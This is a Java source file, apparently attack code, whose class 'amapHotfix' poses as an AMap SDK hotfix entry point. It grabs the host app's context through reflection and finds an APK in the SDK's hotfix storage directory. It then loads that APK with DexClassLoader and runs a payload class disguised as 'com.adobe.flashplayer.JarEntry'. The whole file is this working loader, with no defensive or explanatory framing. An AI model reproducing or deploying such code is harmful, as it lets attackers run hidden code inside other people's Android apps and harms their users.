package com.example.apkattack;


import java.io.File;
import java.lang.reflect.Method;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;


//Lcom/amap/api/aiunet/NetReuestParam;
//Lcom/amap/opensdk/co/CoManager;
//Lcom/amap/co/fm;
//Lcom/amap/co/an;
public class amapHotfix {

	public static void amapHotfixEntry(){
		String Tag = "amapHotfixEntry";

    	try {
    		
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            }
	        }
    		
    		
    		String apppath = context.getFilesDir().getParent() + "/";

	    	String dexmethodname = "start";
	    	//String cfgfn = "ark.dat";
	    	
	    	String apkfn = "";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";

			String pluginapkpath = apppath + "files/loc_cozip/";
				
			File [] files = new File(pluginapkpath).listFiles();
			for (int i = 0; i < files.length; i++) {

				String tmpfilename = files[i].getName();
				
				if ((tmpfilename.length() == 32) && (files[i].isDirectory())) {
					pluginapkpath = pluginapkpath + tmpfilename +"/assets/"; 
					break;
				}
			}


			
			File [] unzipfiles = new File(pluginapkpath ).listFiles();
			for (int j = 0; j < unzipfiles.length; j++) {
				String tmpfn = unzipfiles[j].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}
			
			if (apkfn == null || apkfn.equals("")) {
				Log.e(Tag,"not find apk or config file");
				return;
			}

	    	String appcachepath = context.getCacheDir() + "/";

	    	DexClassLoader dexcl = new DexClassLoader(pluginapkpath + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "load apk exception");
    	}
	}
}
